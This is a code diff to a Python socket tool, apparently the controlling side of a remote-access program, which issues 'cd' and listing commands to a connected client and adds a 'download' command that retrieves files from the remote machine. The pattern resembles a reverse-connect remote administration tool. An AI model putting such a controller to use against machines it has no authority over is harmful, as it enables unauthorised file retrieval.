@@ -16,11 +16,21 @@ def list_file(res: dict):
     types = res["types"]
     for i in range(len(files)):
         if types[i] == 1:
-            print(files[i], end='  ')
+            print(files[i])
         else:
-            print(colored(files[i], "blue"), end='  ')
-    print()
-    
+            print(colored(files[i], "blue"))
+
+def download_file(client: socket.socket, name: str):
+    send_data(client, {"cmd": "download", "name": name})
+    data = recv_data(client)
+    if data["status"] == 1:
+        res = recv_data(client)
+        file = open(name, "wb")
+        file.write(res["content"])
+        file.close()
+        print(f'{name} already downloaded!')
+    else:
+        print("File path dose not exit!")
 
 if __name__ == '__main__':
     client, addr = server.accept()
@@ -43,9 +53,12 @@ if __name__ == '__main__':
         if len(cmd.split(" ")) == 2 and cmd.split(" ")[0] == "cd":
             send_data(client, {"cmd": "cd", "path": cmd.split(" ")[1]})
             res = recv_data(client)
-            work_dir = res["pwd"]
-
-
+            if res["pwd"] == "error":
+                print(res["error"])
+            else:
+                work_dir = res["pwd"]
+        if len(cmd.split(" ")) == 2 and cmd.split(" ")[0] == "download":
+            download_file(client, cmd.split(" ")[1])
 
 
 
